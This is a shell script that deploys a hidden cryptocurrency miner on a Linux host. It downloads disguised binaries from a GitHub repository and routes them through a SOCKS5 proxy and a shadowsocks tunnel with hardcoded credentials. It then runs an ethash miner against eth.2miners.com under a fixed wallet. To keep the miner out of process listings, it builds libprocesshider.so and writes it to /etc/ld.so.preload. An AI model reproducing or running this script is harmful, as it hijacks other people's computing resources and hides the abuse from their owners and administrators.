#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 52.15.235.202:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
chmod +x basket

apt -y install shadowsocks-libev rng-tools
rngd -r /dev/urandom
ss-local -s 52.15.235.202 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBasket.zip
unzip magicBasket.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

sudo ./basket -a ethash -o eth.2miners.com:2020 -u nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe.$(echo $(shuf -i 1-9999 -n 1)-pentil) -log --proxy 127.0.0.1:9999
